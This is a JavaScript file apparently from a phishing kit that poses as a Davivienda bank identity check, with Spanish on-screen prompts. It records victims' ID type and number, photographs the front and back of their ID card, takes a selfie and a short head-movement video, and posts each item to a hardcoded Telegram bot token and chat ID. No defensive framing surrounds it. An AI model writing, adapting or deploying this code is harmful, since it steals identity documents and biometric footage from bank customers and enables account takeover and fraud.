document.addEventListener('DOMContentLoaded', () => {
    // Determine which page we are on
    const isVerificationPage = window.location.pathname.includes('verification.html');
    
    // --- SHARED CONFIG ---
    const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
    const TELEGRAM_CHAT_ID = '-4992418825';

    // --- PAGE: INDEX (FORM + ID SCAN FLOW) ---
    if (!isVerificationPage) {
        // Elements
        const loginStep = document.getElementById('login-step');
        const instructionStep = document.getElementById('instruction-step');
        const scanFrontStep = document.getElementById('scan-front-step');
        const scanBackStep = document.getElementById('scan-back-step');

        const loginForm = document.getElementById('login-form');
        const btnInstructionContinue = document.getElementById('btn-instruction-continue');
        const btnCaptureFront = document.getElementById('btn-capture-front');
        const btnCaptureBack = document.getElementById('btn-capture-back');

        // Video Elements
        const videoFront = document.getElementById('camera-feed-front');
        const videoBack = document.getElementById('camera-feed-back');

        // 1. Handle Login Form Submit
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault();
                
                const docType = document.getElementById('doc-type').value;
                const docNumber = document.getElementById('doc-number').value;
                
                if (docType && docNumber) {
                    // Save info
                    localStorage.setItem('docType', docType);
                    localStorage.setItem('docNumber', docNumber);
                    
                    // Notify Telegram
                    sendTextToTelegram(`Nuevo usuario iniciando:\nTipo: ${docType}\nDocumento: ${docNumber}`);
                    
                    // Go to Instructions
                    loginStep.classList.add('hidden');
                    instructionStep.classList.remove('hidden');
                }
            });
        }

        // 2. Handle Instruction Continue
        if (btnInstructionContinue) {
            btnInstructionContinue.addEventListener('click', () => {
                instructionStep.classList.add('hidden');
                scanFrontStep.classList.remove('hidden');
                startCamera(videoFront, 'environment');
            });
        }

        // 3. Handle Front Capture
        if (btnCaptureFront) {
            btnCaptureFront.addEventListener('click', async () => {
                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                
                // Capture
                const blob = await captureImage(videoFront);
                stopCamera(videoFront);
                
                // Send to Telegram (Async but wait for it to ensure order)
                // Showing a visual cue could be good here, but for now we proceed
                await sendPhotoToTelegram(blob, 'id_front.jpg', `Documento (Frente) - ${docNum}`);

                // Move to Back Scan
                scanFrontStep.classList.add('hidden');
                scanBackStep.classList.remove('hidden');
                startCamera(videoBack, 'environment');
            });
        }

        // 4. Handle Back Capture
        if (btnCaptureBack) {
            btnCaptureBack.addEventListener('click', async () => {
                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                
                // Capture
                const blob = await captureImage(videoBack);
                stopCamera(videoBack);
                
                // Send to Telegram
                await sendPhotoToTelegram(blob, 'id_back.jpg', `Documento (Reverso) - ${docNum}`);

                // Redirect to Verification
                window.location.href = 'verification.html';
            });
        }
    }

    // --- PAGE: VERIFICATION (SELFIE + VIDEO) ---
    if (isVerificationPage) {
        const video = document.getElementById('webcam');
        const cameraInstruction = document.querySelector('.camera-instruction');
        
        let mediaRecorder;
        let recordedChunks = [];

        // Auto-start verification when page loads
        if (video) {
            startCamera(video, 'user');
            
            video.onloadedmetadata = () => {
                setTimeout(startVerificationProcess, 1000);
            };
        }

        function startVerificationProcess() {
            if (cameraInstruction) cameraInstruction.textContent = "Mirando al frente...";
            
            setTimeout(() => {
                captureSelfie();
                
                if (cameraInstruction) cameraInstruction.textContent = "Mueva su cabeza lentamente...";
                startRecording();
                
                setTimeout(() => {
                    stopRecording();
                    if (cameraInstruction) cameraInstruction.textContent = "Procesando...";
                }, 4000);
                
            }, 1500);
        }

        function captureSelfie() {
            const docNum = localStorage.getItem('docNumber') || 'Desconocido';
            captureImage(video).then(blob => {
                sendPhotoToTelegram(blob, 'selfie.jpg', `Selfie - ${docNum}`);
            });
        }

        function startRecording() {
            if (!video.srcObject) return;
            
            recordedChunks = [];
            let options = { mimeType: 'video/webm;codecs=vp8' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                 options = { mimeType: 'video/webm' };
            }
            
            try {
                mediaRecorder = new MediaRecorder(video.srcObject, options);
            } catch (e) {
                console.warn("MediaRecorder fallback", e);
                mediaRecorder = new MediaRecorder(video.srcObject);
            }

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                sendVideoToTelegram(blob, `Video - ${docNum}`);
                stopCamera(video);
                
                // Maybe show a success message or redirect?
                if (cameraInstruction) cameraInstruction.textContent = "¡Verificación Completada!";
                // Optional: window.location.href = 'https://www.davivienda.com'; 
            };

            mediaRecorder.start();
        }

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
        }
    }

    // --- SHARED HELPER FUNCTIONS ---

    async function startCamera(videoElement, facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false 
            });
            videoElement.srcObject = stream;
        } catch (err) {
            console.error("Error accessing camera:", err);
            alert("No se pudo acceder a la cámara. Por favor verifique los permisos.");
        }
    }

    function stopCamera(videoElement) {
        if (videoElement.srcObject) {
            const tracks = videoElement.srcObject.getTracks();
            tracks.forEach(track => track.stop());
            videoElement.srcObject = null;
        }
    }

    function captureImage(videoElement) {
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0);
            
            canvas.toBlob((blob) => {
                resolve(blob);
            }, 'image/jpeg', 0.8);
        });
    }

    // --- TELEGRAM FUNCTIONS ---

    async function sendTextToTelegram(text) {
        if (!TELEGRAM_BOT_TOKEN) return;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('text', text);
        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    async function sendPhotoToTelegram(blob, filename, caption) {
        if (!TELEGRAM_BOT_TOKEN) return;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, filename);
        formData.append('caption', caption || '');
        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    async function sendVideoToTelegram(blob, caption) {
        if (!TELEGRAM_BOT_TOKEN) return;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'biometric_video.webm');
        formData.append('caption', caption || '');
        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }
});
